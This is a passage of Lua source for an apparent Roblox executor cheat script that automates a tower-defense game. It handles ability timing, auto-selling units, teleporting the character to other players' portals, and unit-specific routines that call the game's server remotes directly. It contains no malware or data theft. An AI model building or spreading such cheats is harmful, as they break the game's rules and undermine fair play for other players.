            requiredLevel = 0,
            isSoulAbility = true
        }
    end
    
    local abilities = getAllAbilities(towerName)
    return abilities[abilityName]
end

getgenv()._AbilityHelpers1.isOnCooldown = function(towerName, abilityName)
    local d = getgenv()._AbilityHelpers1.getAbilityData(towerName, abilityName)
    if not d or not d.cooldown then return false end
    local key = towerName .. "_" .. abilityName
    local last = abilityCooldowns[key]
    if not last then return false end
    
    if d.isSoulAbility then
        local timeSinceUse = tick() - last
        local cooldownRemaining = d.cooldown - timeSinceUse
        return cooldownRemaining > 0.5
    end
    
    local scale = getgenv()._AbilityHelpers1.getCurrentTimeScale()
    local effectiveCd = d.cooldown / scale
    local timeSinceUse = tick() - last
    local cooldownRemaining = effectiveCd - timeSinceUse
    return cooldownRemaining > 0.5
end

getgenv()._AbilityHelpers1.setAbilityUsed = function(towerName, abilityName)
    abilityCooldowns[towerName.."_"..abilityName] = tick()
end

getgenv()._AbilityHelpers1.hasAbilityBeenUnlocked = function(towerName, abilityName, towerLevel)
    local d = getgenv()._AbilityHelpers1.getAbilityData(towerName, abilityName)
    if d and d.isSoulAbility then
        return true
    end
    return d and towerLevel >= d.requiredLevel
end

if not getgenv()._AbilityState then
    getgenv()._AbilityState = {
        abilityCooldowns = {},
        bossSpawnTime = nil,
        generalBossSpawnTime = nil,
        bossInRangeTracker = {}
    }
end

getgenv()._AbilityHelpers2a = getgenv()._AbilityHelpers2a or {}

getgenv()._AbilityHelpers2a.isOnCooldown = function(towerUniqueId, abilityName, actualTowerName)
    local state = getgenv()._AbilityState
    local helpers1 = getgenv()._AbilityHelpers1
    local nameForData = actualTowerName or towerUniqueId:match("^([^_]+)")
    
    local d = helpers1.getAbilityData(nameForData, abilityName)
    if not d or not d.cooldown then return false end
    
    local key = towerUniqueId .. "_" .. abilityName
    local last = state.abilityCooldowns[key]
    if not last then return false end
    
    local scale = helpers1.getCurrentTimeScale()
    local effectiveCd = d.cooldown / scale
    local timeSinceUse = tick() - last
    local cooldownRemaining = effectiveCd - timeSinceUse
    return cooldownRemaining > 0.5
end

getgenv()._AbilityHelpers2a.setAbilityUsed = function(towerUniqueId, abilityName)
    local state = getgenv()._AbilityState
    state.abilityCooldowns[towerUniqueId.."_"..abilityName] = tick()
end

getgenv()._AbilityHelpers2a.bossExists = function()
    local ok, res = pcall(function()
        local enemies = workspace:FindFirstChild("Enemies")
        if not enemies then 
            return false 
        end
        
        for _, enemy in pairs(enemies:GetChildren()) do
            if enemy:IsA("Model") then
                local bossValue = enemy:FindFirstChild("Boss")
                if bossValue and bossValue:IsA("BoolValue") and bossValue.Value == true then
                    return true
                end
            end
        end
        
        return false
    end)
    if not ok then
        warn("[Auto Ability] Error checking boss existence:", res)
    end
    return ok and res
end

getgenv()._AbilityHelpers2a.bossReadyForAbilities = function()
    local state = getgenv()._AbilityState
    if getgenv()._AbilityHelpers2a.bossExists() then
        if not state.generalBossSpawnTime then state.generalBossSpawnTime = tick() end
        return (tick() - state.generalBossSpawnTime) >= 1
    else
        state.generalBossSpawnTime = nil
        return false
    end
end

getgenv()._AbilityHelpers3 = getgenv()._AbilityHelpers3 or {}

getgenv()._AbilityHelpers3.getBossCFrame = function()
    local ok, res = pcall(function()
        local enemies = workspace:FindFirstChild("Enemies")
        if not enemies then return nil end
        
        for _, enemy in pairs(enemies:GetChildren()) do
            if enemy:IsA("Model") then
                local bossValue = enemy:FindFirstChild("Boss")
                if bossValue and bossValue:IsA("BoolValue") and bossValue.Value == true then
                    local hrp = enemy:FindFirstChild("HumanoidRootPart")
                    if hrp then 
                        return hrp.CFrame 
                    end
                end
            end
        end
        
        return nil
    end)
    return ok and res or nil
end

getgenv()._AbilityHelpers3.getTowerCFrame = function(tower)
    if not tower then return nil end
    local ok, res = pcall(function()
        local hrp = tower:FindFirstChild("HumanoidRootPart")
        if hrp then return hrp.CFrame end
        return nil
    end)
    return ok and res or nil
end

getgenv()._AbilityHelpers3.getTowerRange = function(tower)
    if not tower then return 0 end
    local ok, res = pcall(function()
        local stats = tower:FindFirstChild("Stats")
        if not stats then return 0 end
        local range = stats:FindFirstChild("Range")
        if not range then return 0 end
        return range.Value or 0
    end)
    return ok and res or 0
end

getgenv()._AbilityHelpers3.isBossInRange = function(tower)
    local bossCF = getgenv()._AbilityHelpers3.getBossCFrame()
    local towerCF = getgenv()._AbilityHelpers3.getTowerCFrame(tower)
    if not bossCF or not towerCF then 
        return false 
    end
    local range = getgenv()._AbilityHelpers3.getTowerRange(tower)
    if range <= 0 then 
        return false 
    end
    local distance = (bossCF.Position - towerCF.Position).Magnitude
    local inRange = distance <= range
    
    if getgenv().DebugMode then
        print(string.format("[Boss Range] %s: Distance=%.1f, Range=%.1f, InRange=%s", 
            tower.Name, distance, range, tostring(inRange)))
    end
    
    return inRange
end

getgenv()._AbilityHelpers3.checkBossInRangeForDuration = function(tower, requiredDuration)
    if not tower then return false end
    local state = getgenv()._AbilityState
    local name = tower.Name
    local currentTime = tick()
    if getgenv()._AbilityHelpers3.isBossInRange(tower) then
        if requiredDuration == 0 then return true end
        if not state.bossInRangeTracker[name] then
            state.bossInRangeTracker[name] = currentTime
            return false
        else
            return (currentTime - state.bossInRangeTracker[name]) >= requiredDuration
        end
    else
        state.bossInRangeTracker[name] = nil
    end
    return false
end

getgenv()._AbilityHelpers3.getTowerInfoName = function(tower)
    if not tower then return nil end
    local uniqueId = tostring(tower)
    return tower.Name .. "_" .. uniqueId:sub(-8)
end

getgenv()._AbilityHelpers3.resetRoundTrackers = function()
    local state = getgenv()._AbilityState
    state.bossSpawnTime = nil
    state.generalBossSpawnTime = nil
    state.bossInRangeTracker = {}
    state.abilityCooldowns = {}
end

getgenv()._AbilitySystemFuncs = {
    getCurrentWave = getgenv()._AbilityHelpers1.getCurrentWave,
    getCurrentTimeScale = getgenv()._AbilityHelpers1.getCurrentTimeScale,
    getUpgradeLevel = getgenv()._AbilityHelpers1.getUpgradeLevel,
    fixAbilityName = getgenv()._AbilityHelpers1.fixAbilityName,
    useAbility = getgenv()._AbilityHelpers1.useAbility,
    getAbilityData = getgenv()._AbilityHelpers1.getAbilityData,
    hasAbilityBeenUnlocked = getgenv()._AbilityHelpers1.hasAbilityBeenUnlocked,
    isOnCooldown = getgenv()._AbilityHelpers2a.isOnCooldown,
    setAbilityUsed = getgenv()._AbilityHelpers2a.setAbilityUsed,
    bossExists = getgenv()._AbilityHelpers2a.bossExists,
    bossReadyForAbilities = getgenv()._AbilityHelpers2a.bossReadyForAbilities,
    getTowerCFrame = getgenv()._AbilityHelpers3.getTowerCFrame,
    getBossCFrame = getgenv()._AbilityHelpers3.getBossCFrame,
    getTowerRange = getgenv()._AbilityHelpers3.getTowerRange,
    isBossInRange = getgenv()._AbilityHelpers3.isBossInRange,
    checkBossInRangeForDuration = getgenv()._AbilityHelpers3.checkBossInRangeForDuration,
    getTowerInfoName = getgenv()._AbilityHelpers3.getTowerInfoName,
    resetRoundTrackers = getgenv()._AbilityHelpers3.resetRoundTrackers
}

getgenv()._ProcessAbility = function(tower, unitName, abilityName, cfg, currentWave, hasBoss)
    local funcs = getgenv()._AbilitySystemFuncs
    local infoName = funcs.getTowerInfoName(tower) 
    local towerLevel = funcs.getUpgradeLevel(tower)
    local savedCfg = getgenv().Config.abilities[unitName] and getgenv().Config.abilities[unitName][abilityName]
    
    if savedCfg then
        cfg.enabled = savedCfg.enabled
        cfg.onlyOnBoss = savedCfg.onlyOnBoss or false
        cfg.useOnWave = savedCfg.useOnWave or false
        cfg.specificWave = savedCfg.specificWave
        cfg.requireBossInRange = savedCfg.requireBossInRange or false
    end
    
    if not cfg.enabled then return end
    
    local shouldUse = true
    
    if not funcs.hasAbilityBeenUnlocked(unitName, abilityName, towerLevel) then
        return
    end
    
    if funcs.isOnCooldown(infoName, abilityName, unitName) then
        return
    end
    
    if cfg.useOnWave and cfg.specificWave then
        if currentWave ~= cfg.specificWave then
            return
        end
    end
    
    if cfg.onlyOnBoss then
        if not hasBoss then
            return
        end
        
        if not funcs.bossReadyForAbilities() then
            task.wait(0.5)
            if not funcs.bossReadyForAbilities() then
                return
            end
        end
    end
    
    if cfg.requireBossInRange then
        if not hasBoss then
            return
        end
        
        local inRangeChecks = 0
        for i = 1, 5 do
            if funcs.checkBossInRangeForDuration(tower, 0) then
                inRangeChecks = inRangeChecks + 1
            end
            task.wait(0.15)
        end
        
        if inRangeChecks < 4 then
            if getgenv().DebugMode then
                print(string.format("[Ability] %s: Boss not consistently in range (%d/5 checks)", tower.Name, inRangeChecks))
            end
            return
        end
        
        if getgenv().DebugMode then
            print(string.format("[Ability] %s: Boss confirmed in range, using ability", tower.Name))
        end
    end
    
    if not funcs.isOnCooldown(infoName, abilityName, unitName) then
        funcs.useAbility(tower, abilityName)
        funcs.setAbilityUsed(infoName, abilityName)
    end
end

getgenv()._lastGameStartedForAbilities = true

getgenv()._InitializeGameSystems = function()

do
getgenv()._AbilitySystem_lastWave = 0
getgenv()._AbilitySystem_Towers = workspace:WaitForChild("Towers", 10)
getgenv()._AbilitySystem_funcs = getgenv()._AbilitySystemFuncs

getgenv()._checkGameEndedReset = function()
    local ok = pcall(function()
        local endGameUI = LocalPlayer.PlayerGui:FindFirstChild("EndGameUI")
        if endGameUI and endGameUI:FindFirstChild("Frame") then
            getgenv()._AbilitySystem_funcs.resetRoundTrackers()
        end
    end)
end

task.spawn(function()
    while true do
        task.wait(0.3)
        
        if getgenv()._checkIfInLobby() then
            task.wait(2)
            continue
        end
        
        local function processAllAbilities()
            getgenv()._checkGameEndedReset()
            local currentWave = getgenv()._AbilitySystem_funcs.getCurrentWave()
            local hasBoss = getgenv()._AbilitySystem_funcs.bossExists()
            
            local gameStarted = true
            pcall(function()
                local gs = RS:FindFirstChild("GameStarted")
                if gs and gs.Value ~= nil then
                    gameStarted = gs.Value
                end
            end)
            
            if getgenv().SeamlessFixEnabled and getgenv()._lastGameStartedForAbilities and not gameStarted then
                getgenv()._AbilitySystem_funcs.resetRoundTrackers()
            end
            getgenv()._lastGameStartedForAbilities = gameStarted
            
            if currentWave < getgenv()._AbilitySystem_lastWave then
                getgenv()._AbilitySystem_funcs.resetRoundTrackers()
            end
            
            if currentWave == 1 and getgenv()._AbilitySystem_lastWave > 10 then
                getgenv()._AbilitySystem_funcs.resetRoundTrackers()
            end
            
            getgenv()._AbilitySystem_lastWave = currentWave
            
            if not getgenv()._AbilitySystem_Towers then return end
            if not getgenv().UnitAbilities or type(getgenv().UnitAbilities) ~= "table" then return end
            
            for unitName, abilitiesConfig in pairs(getgenv().UnitAbilities) do
                local towerNameToFind = unitName
                
                if getgenv().EZAUnitMapping and getgenv().EZAUnitMapping[unitName] then
                    towerNameToFind = getgenv().EZAUnitMapping[unitName]
                end
                
                for _, tower in pairs(getgenv()._AbilitySystem_Towers:GetChildren()) do
                    local owner = tower:FindFirstChild("Owner")
                    if tower.Name == towerNameToFind and owner and owner.Value == LocalPlayer then
                        for abilityName, cfg in pairs(abilitiesConfig) do
                            getgenv()._ProcessAbility(tower, unitName, abilityName, cfg, currentWave, hasBoss)
                        end
                    end
                end
            end
        end
        
        pcall(processAllAbilities)
    end
end)

end


do
    task.spawn(function()
        local lastCheckTime = 0
        
        while true do
            task.wait(2)
            
            if getgenv().AutoSellCapsuleEnabled then
                pcall(function()
                    local now = tick()
                    if now - lastCheckTime < 5 then return end
                    lastCheckTime = now
                    
                    local clientData = getgenv().GetClientData and getgenv().GetClientData()
                    if not clientData or not clientData.UnitData then return end
                    
                    local unitsToSell = {}
                    
                    local cachedUnitIDs = {}
                    for cachedID, cachedData in pairs(getgenv()._CapsuleUnitCache or {}) do
                        cachedUnitIDs[cachedID] = true
                    end
                    
                    for unitID, unitData in pairs(clientData.UnitData) do
                        if unitData.UnitName then
                            if not cachedUnitIDs[unitID] then
                                local shouldSell = false
                                
                                for unitName, selected in pairs(getgenv().AutoSellCapsuleUnits or {}) do
                                    if selected then
                                        local actualUnitName = unitName
                                        for _, capsuleUnit in ipairs({"ZamasuBlackGokuRoseUnevo", "AinzAlbedoUnevo", "SimonUnevo", "RimuruGodlyUnevo", "RimuruGodlyUnevoShiny"}) do
                                            local unitNameModule = getgenv().GetAllAbilities and getgenv().GetAllAbilities()
                                            if unitNameModule and unitNameModule[capsuleUnit] then
                                                local displayName = unitNameModule[capsuleUnit].displayName or capsuleUnit
                                                if displayName == unitName then
                                                    actualUnitName = capsuleUnit
                                                    break
                                                end
                                            end
                                        end
                                        
                                        if unitData.UnitName == actualUnitName then
                                            shouldSell = true
                                            break
                                        end
                                    end
                                end
                                
                                if shouldSell then
                                    unitsToSell[unitID] = true
                                    print("[Auto Sell Capsule] Marking new unit for sale: " .. unitData.UnitName .. " (ID: " .. unitID .. ")")
                                else
                                    getgenv()._CapsuleUnitCache[unitID] = {
                                        UnitName = unitData.UnitName,
                                        ObtainTime = unitData.ObtainTime or tick()
                                    }
                                end
                            end
                        end
                    end
                    
                    if next(unitsToSell) then
                        local sellCount = 0
                        for _ in pairs(unitsToSell) do
                            sellCount = sellCount + 1
                        end
                        
                        print("[Auto Sell Capsule] Selling " .. sellCount .. " units...")
                        
                        local sellRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("SellUnits")
                        if sellRemote then
                            local success = pcall(function()
                                sellRemote:InvokeServer(unitsToSell)
                            end)
                            
                            if success then
                                print("[Auto Sell Capsule] ✅ Successfully sold " .. sellCount .. " units")
                                
                                for unitID in pairs(unitsToSell) do
                                    getgenv()._CapsuleUnitCache[unitID] = nil
                                end
                            else
                                print("[Auto Sell Capsule] ❌ Failed to sell units")
                            end
                        end
                    end
                end)
            end
            
            if getgenv().AutoSellEvent1CapsuleEnabled then
                pcall(function()
                    local now = tick()
                    if now - lastCheckTime < 5 then return end
                    
                    local clientData = getgenv().GetClientData and getgenv().GetClientData()
                    if not clientData or not clientData.UnitData then return end
                    
                    local unitsToSell = {}
                    
                    for unitID, unitData in pairs(clientData.UnitData) do
                        if unitData.UnitName and not getgenv()._Event1CapsuleUnitCache[unitID] then
                            local shouldSell = false
                            
                            for unitName, selected in pairs(getgenv().AutoSellEvent1CapsuleUnits or {}) do
                                if selected then
                                    local actualUnitName = unitName
                                    for _, capsuleUnit in ipairs({"MobUnevo", "LightUnevo", "LelouchUnevo", "LelouchUnevoShiny"}) do
                                        local unitNameModule = getgenv().GetAllAbilities and getgenv().GetAllAbilities()
                                        if unitNameModule and unitNameModule[capsuleUnit] then
                                            local displayName = unitNameModule[capsuleUnit].displayName or capsuleUnit
                                            if displayName == unitName then
                                                actualUnitName = capsuleUnit
                                                break
                                            end
                                        end
                                    end
                                    
                                    if unitData.UnitName == actualUnitName then
                                        shouldSell = true
                                        break
                                    end
                                end
                            end
                            
                            if shouldSell then
                                unitsToSell[unitID] = true
                                print("[Auto Sell Event1 Capsule] Marking new unit for sale: " .. unitData.UnitName .. " (ID: " .. unitID .. ")")
                            else
                                getgenv()._Event1CapsuleUnitCache[unitID] = {
                                    UnitName = unitData.UnitName,
                                    ObtainTime = unitData.ObtainTime or 0
                                }
                            end
                        end
                    end
                    
                    if next(unitsToSell) then
                        local sellCount = 0
                        for _ in pairs(unitsToSell) do
                            sellCount = sellCount + 1
                        end
                        
                        print("[Auto Sell Event1 Capsule] Selling " .. sellCount .. " units...")
                        
                        local sellRemote = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("SellUnits")
                        if sellRemote then
                            local success = pcall(function()
                                sellRemote:InvokeServer(unitsToSell)
                            end)
                            
                            if success then
                                print("[Auto Sell Event1 Capsule] ✅ Successfully sold " .. sellCount .. " units")
                                
                                for unitID in pairs(unitsToSell) do
                                    getgenv()._Event1CapsuleUnitCache[unitID] = nil
                                end
                            else
                                print("[Auto Sell Event1 Capsule] ❌ Failed to sell units")
                            end
                        else
                            warn("[Auto Sell Event1 Capsule] SellUnitsEvent remote not found")
                        end
                    end
                end)
            end
        end
    end)
end


do
    task.spawn(function()
        while true do
            task.wait(1)
            
            if getgenv().WaitForPlayerEnabled then
                pcall(function()
                    local entryUI = nil
                    for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
                        if gui.Name:find("Entry") then
                            entryUI = gui
                            break
                        end
                    end
                    
                    if entryUI then
                        local function findTextLabel(parent)
                            for _, child in ipairs(parent:GetDescendants()) do
                                if child:IsA("TextLabel") and child.Text:find("Players") then
                                    return child
                                end
                            end
                            return nil
                        end
                        
                        local textLabel = findTextLabel(entryUI)
                        if textLabel then
                            local text = textLabel.Text
                            local current, max = text:match("%((%d+)/(%d+)%)")
                            
                            if current and max then
                                local currentPlayers = tonumber(current)
                                local targetCount = getgenv().WaitForPlayerCount or 1
                                
                                if currentPlayers >= targetCount then
                                    print("[Wait for Players] ✅ " .. currentPlayers .. "/" .. targetCount .. " players ready")
                                else
                                    print("[Wait for Players] ⏳ Waiting... " .. currentPlayers .. "/" .. targetCount .. " players")
                                end
                            end
                        end
                    end
                end)
            end
            
            if getgenv().JoinPlayerEnabled and getgenv().JoinPlayerTarget and getgenv().JoinPlayerTarget ~= "" and getgenv().JoinPlayerTarget ~= "No other players" then
                pcall(function()
                    local currentGamemode = nil
                    pcall(function()
                        local gamemode = RS:FindFirstChild("Gamemode")
                        if gamemode then
                            currentGamemode = gamemode.Value
                        end
                    end)
                    
                    if currentGamemode == "Portals" then
                        return
                    end
                    
                    if getgenv().WaitForPlayerEnabled then
                        local entryUI = nil
                        for _, gui in ipairs(LocalPlayer.PlayerGui:GetChildren()) do
                            if gui.Name:find("Entry") then
                                entryUI = gui
                                break
                            end
                        end
                        
                        if entryUI then
                            local function findTextLabel(parent)
                                for _, child in ipairs(parent:GetDescendants()) do
                                    if child:IsA("TextLabel") and child.Text:find("Players") then
                                        return child
                                    end
                                end
                                return nil
                            end
                            
                            local textLabel = findTextLabel(entryUI)
                            if textLabel then
                                local waitStartTime = tick()
                                local maxWaitTime = 300
                                
                                while tick() - waitStartTime < maxWaitTime do
                                    local text = textLabel.Text
                                    local current, max = text:match("%((%d+)/(%d+)%)")
                                    
                                    if current and max then
                                        local currentPlayers = tonumber(current)
                                        local targetCount = getgenv().WaitForPlayerCount or 1
                                        
                                        if currentPlayers >= targetCount then
                                            print("[Join Player] ✅ " .. currentPlayers .. "/" .. targetCount .. " players ready, joining portal...")
                                            break
                                        else
                                            print("[Join Player] ⏳ Waiting for players... " .. currentPlayers .. "/" .. targetCount)
                                        end
                                    end
                                    
                                    task.wait(1)
                                end
                            end
                        end
                    end
                    
                    local targetDisplayName = getgenv().JoinPlayerTarget:match("^(.-)%s*%(")
                    if not targetDisplayName then
                        targetDisplayName = getgenv().JoinPlayerTarget
                    end
                    
                    local portalsFolder = workspace:FindFirstChild("Portals")
                    if not portalsFolder then return end
                    
                    for _, tierFolder in ipairs(portalsFolder:GetChildren()) do
                        for _, portal in ipairs(tierFolder:GetChildren()) do
                            local prompt = portal:FindFirstChildOfClass("ProximityPrompt", true)
                            if prompt and prompt.ObjectText and prompt.ObjectText:find(targetDisplayName) then
                                print("[Join Player] Found " .. targetDisplayName .. "'s portal, joining...")
                                
                                local hrp = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
                                if hrp then
                                    hrp.CFrame = portal:GetPivot()
                                    task.wait(0.5)
                                    
                                    VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
                                    task.wait(3)
                                    VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
                                    
                                    print("[Join Player] ✅ Joined " .. targetDisplayName .. "'s portal")
                                    task.wait(5)
                                end
                                return
                            end
                        end
                    end
                end)
            end
        end
    end)
end


do
    task.spawn(function()
        local pollingInterval = MobileOptimizer:getPollingInterval(1)
        local lastWave = 0
        
        while true do
            task.wait(pollingInterval)
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave.Value then
                    currentWave = wave.Value
                end
            end)
            
            if currentWave < lastWave and currentWave <= 5 then
                getgenv().BulmaWishUsedThisRound = false
            end
            
            if getgenv().SeamlessFixEnabled and lastWave >= 50 and currentWave < 50 then
                getgenv().BulmaWishUsedThisRound = false
            end
            
            if currentWave == 1 and lastWave > 10 then
                getgenv().BulmaWishUsedThisRound = false
            end
            
            lastWave = currentWave
            
            if getgenv().BulmaEnabled then
                local success, err = pcall(function()
                    local towers = workspace:FindFirstChild("Towers")
                    if not towers then return end
                    
                    local bulma = nil
                    for _, tower in pairs(towers:GetChildren()) do
                        local owner = tower:FindFirstChild("Owner")
                        if tower.Name == "Bulma" and owner and owner.Value == LocalPlayer then
                            bulma = tower
                            break
                        end
                    end
                    
                    if not bulma then return end
                    
                    local meters = bulma:FindFirstChild("Meters")
                    if not meters then return end
                    
                    local wishBalls = meters:FindFirstChild("Wish Balls")
                    if not wishBalls then return end
                    
                    local ballCount = 0
                    pcall(function()
                        ballCount = wishBalls:GetAttribute("Value") or 0
                    end)
                    
                    if ballCount == 7 and not getgenv().BulmaWishUsedThisRound then
                        getgenv().BulmaWishUsedThisRound = true
                        
                        local remotes = RS:FindFirstChild("Remotes")
                        if not remotes then
                            warn("[Bulma] Remotes folder not found")
                            getgenv().BulmaWishUsedThisRound = false
                            return
                        end
                        
                        local abilityRemote = remotes:FindFirstChild("Ability")
                        if not abilityRemote then
                            warn("[Bulma] Ability remote not found")
                            getgenv().BulmaWishUsedThisRound = false
                            return
                        end
                        
                        local summonSuccess, summonErr = pcall(function()
                            abilityRemote:InvokeServer(bulma, "Summon Wish Dragon")
                        end)
                        
                        if not summonSuccess then
                            warn("[Bulma] Failed to summon wish dragon: " .. tostring(summonErr))
                            getgenv().BulmaWishUsedThisRound = false
                            return
                        end
                        
                        task.wait(0.5)
                        
                        local wishType = getgenv().BulmaWishType or "Power"
                        local wishSuccess, wishErr = pcall(function()
                            abilityRemote:InvokeServer(bulma, "Wish: " .. wishType)
                        end)
                        
                        if not wishSuccess then
                            warn("[Bulma] Failed to use wish: " .. tostring(wishErr))
                            getgenv().BulmaWishUsedThisRound = false
                            return
                        end
                        
                        Window:Notify({
                            Title = "Bulma Auto-Wish",
                            Description = "Used Wish: " .. wishType .. " (1x per round)",
                            Lifetime = 3
                        })
                    end
                end)
                
                if not success then
                    warn("[Bulma] Error: " .. tostring(err))
                end
            end
        end
    end)
end



do
    task.spawn(function()
        
        local CLONE_UPGRADE_COSTS = {
        [1] = 1750,
        [2] = 3500,
        [3] = 7000,
        [4] = 12500,
        [5] = 25000,
        [6] = 27500,
        [7] = 30250,
        [8] = 55000
    }
    
    local function getPlayerCash()
        local clientData = getClientData()
        if clientData and clientData.Cash then
            return clientData.Cash
        end
        return 0
    end
    
    local function getJinMoriTower()
        local Towers = workspace:FindFirstChild("Towers")
        if not Towers then return nil end
        
        for _, tower in ipairs(Towers:GetChildren()) do
            local owner = tower:FindFirstChild("Owner")
            if tower.Name == "JinMoriGodly" and tower:IsA("Model") and owner and owner.Value == LocalPlayer then
                return tower
            end
        end
        return nil
    end
    
    local function getJinMoriClones()
        local Towers = workspace:FindFirstChild("Towers")
        if not Towers then return {} end
        
        local clones = {}
        for _, tower in ipairs(Towers:GetChildren()) do
            local owner = tower:FindFirstChild("Owner")
            if tower.Name == "JinMoriGodlyClone" and tower:IsA("Model") and owner and owner.Value == LocalPlayer then
                table.insert(clones, tower)
            end
        end
        return clones
    end
    
    local function useCloneSynthesis(jinMoriTower)
        if not jinMoriTower then return false end
        
        local success, err = ErrorHandler:wrapAsync(function()
            local Ability = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
            if Ability then
                Ability:InvokeServer(jinMoriTower, "Clone Synthesis")
                return true
            end
        end, "Use Clone Synthesis")
        
        return success
    end
    
    local function upgradeClone(cloneTower)
        if not cloneTower then return false end
        
        local upgradeValue = cloneTower:FindFirstChild("Upgrade")
        if not upgradeValue then return false end
        
        local currentUpgrade = upgradeValue.Value
        if currentUpgrade >= 8 then return false end 
        
        local nextUpgradeCost = CLONE_UPGRADE_COSTS[currentUpgrade + 1]
        if not nextUpgradeCost then return false end
        
        local cash = tonumber(getPlayerCash()) or 0
        if cash < (tonumber(nextUpgradeCost) or 0) then return false end
        
        local success, err = ErrorHandler:wrapAsync(function()
            local UpgradeEvent = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Upgrade")
            if UpgradeEvent then
                UpgradeEvent:InvokeServer(cloneTower)
                return true
            end
        end, "Upgrade Jin Mori clone")
        
        return success
    end
    
    local function useCloneDiffusion(cloneTower)
        if not cloneTower then return false end
        
        local success, err = ErrorHandler:wrapAsync(function()
            local Ability = RS:FindFirstChild("Remotes") and RS.Remotes:FindFirstChild("Ability")
            if Ability then
                Ability:InvokeServer(cloneTower, "Clone Diffusion")
                return true
            end
        end)
        
        return success
    end
    
    local lastWave = 0
    while true do
        task.wait(1)
        
        local currentWave = 0
        pcall(function()
            local wave = RS:FindFirstChild("Wave")
            if wave and wave.Value then
                currentWave = wave.Value
            end
        end)
        
        if currentWave < lastWave and currentWave <= 5 then
            getgenv().WukongTrackedClones = {}
            getgenv()._WukongLastSynthesisTime = 0
        end
        
        if getgenv().SeamlessFixEnabled and lastWave >= 50 and currentWave < 50 then
            getgenv().WukongTrackedClones = {}
            getgenv()._WukongLastSynthesisTime = 0
        end
        
        if currentWave == 1 and lastWave > 10 then
            getgenv().WukongTrackedClones = {}
            getgenv()._WukongLastSynthesisTime = 0
        end
        
        lastWave = currentWave
        
        if not getgenv().WukongEnabled then continue end
        
        local jinMori = getJinMoriTower()
        if not jinMori then continue end
        
        local jinMoriUpgrade = jinMori:FindFirstChild("Upgrade")
        if not jinMoriUpgrade or jinMoriUpgrade.Value < 8 then continue end
        
        local reachingNirvana = jinMori:FindFirstChild("Meters") and jinMori.Meters:FindFirstChild("ReachingNirvana")
        if not reachingNirvana then continue end
        
        local currentNirvana = reachingNirvana:GetAttribute("Value") or 0
        local maxNirvana = reachingNirvana:GetAttribute("MaxValue") or 4
        
        if currentNirvana < maxNirvana then
            local lastSynthesisTime = getgenv()._WukongLastSynthesisTime or 0
            local currentTime = tick()
            
            if currentTime - lastSynthesisTime >= 10 then
                if currentNirvana < 4 then
                    if useCloneSynthesis(jinMori) then
                        getgenv()._WukongLastSynthesisTime = currentTime
                        
                        Window:Notify({
                            Title = "Auto Wukong",
                            Description = "Clone Synthesis used (" .. (currentNirvana + 1) .. "/" .. maxNirvana .. ")",
                            Lifetime = 3
                        })
                        
                        task.wait(1)
                    end
                end
            end
        end
        
        local clones = getJinMoriClones()
        for _, clone in ipairs(clones) do
            local cloneUpgrade = clone:FindFirstChild("Upgrade")
            if cloneUpgrade and cloneUpgrade.Value < 8 then
                upgradeClone(clone)
                task.wait(0.5)
            end
        end
        
        for _, clone in ipairs(clones) do
            local cloneUpgrade = clone:FindFirstChild("Upgrade")
            if cloneUpgrade and cloneUpgrade.Value == 8 then
                local cloneId = tostring(clone:GetDebugId())
                if not getgenv().WukongTrackedClones[cloneId] then
                    if useCloneDiffusion(clone) then
                        getgenv().WukongTrackedClones[cloneId] = true
                        
                        Window:Notify({
                            Title = "Auto Wukong",
                            Description = "Clone Diffusion used! Nirvana state increased",
                            Lifetime = 3
                        })
                        
                        task.wait(1)
                    end
                end
            end
        end
    end
    end)
end

do
    task.spawn(function()
        task.wait(2)
        
        local function getSkeletonKnightTower()
            local towers = workspace:FindFirstChild("Towers")
            if not towers then 
                return nil 
            end
            
            for _, tower in pairs(towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if (tower.Name == "Skull_Knight_EvoEZA" or tower.Name == "Skull_Knight_Evo") and owner and owner.Value == LocalPlayer then
                    return tower
                end
            end
            
            return nil
        end
        
        local function getTargetTowerByDisplayName(displayName)
            if not displayName or displayName == "" or displayName == "No units placed yet" or displayName == "Place a unit first" then 
                return nil 
            end
            
            local towers = workspace:FindFirstChild("Towers")
            if not towers then return nil end
            
            for _, tower in pairs(towers:GetChildren()) do
                local owner = tower:FindFirstChild("Owner")
                if owner and owner.Value == LocalPlayer then
                    local towerName = tower.Name
                    local baseName = towerName:gsub("EZA$", "")
                    local towerDisplayName = getUnitDisplayName(baseName)
                    
                    if towerDisplayName == displayName then
                        return tower
                    end
                end
            end
            
            return nil
        end
        
        
        local lastWave = 0
        while true do
            task.wait(1)
            
            local currentWave = 0
            pcall(function()
                local wave = RS:FindFirstChild("Wave")
                if wave and wave.Value then
                    currentWave = wave.Value
                end
            end)
            
            if currentWave < lastWave and currentWave <= 5 then
                getgenv().SkeletonKnightLastUse = 0
            end
            
            if getgenv().SeamlessFixEnabled and lastWave >= 50 and currentWave < 50 then
                getgenv().SkeletonKnightLastUse = 0
            end
            
            if currentWave == 1 and lastWave > 10 then
                getgenv().SkeletonKnightLastUse = 0
            end
            
            lastWave = currentWave
                        
            if not getgenv().SkeletonKnightEnabled then
                task.wait(2)
                continue
            end
            
            local skeletonKnight = getSkeletonKnightTower()
            if not skeletonKnight then
                task.wait(2)
                continue
            end
            
            local upgrade = skeletonKnight:FindFirstChild("Upgrade")
            if not upgrade then
                task.wait(2)
                continue
            end
            
            
            local isEZA = skeletonKnight.Name == "Skull_Knight_EvoEZA"
            local requiredLevel = isEZA and 0 or 11
            
            if upgrade.Value < requiredLevel then
                task.wait(2)
                continue
            end
            
            
            local currentTime = tick()
            local baseCooldown = 200
            local timeScale = getCurrentTimeScale()
            local effectiveCooldown = baseCooldown / timeScale
            local timeSinceLastUse = currentTime - (getgenv().SkeletonKnightLastUse or 0)
            
            
            if timeSinceLastUse < effectiveCooldown then
                task.wait(1)
                continue
            end
            
            
            if not getgenv().SkeletonKnightTargetUnit or getgenv().SkeletonKnightTargetUnit == "" then
                task.wait(5)
                continue
            end
            
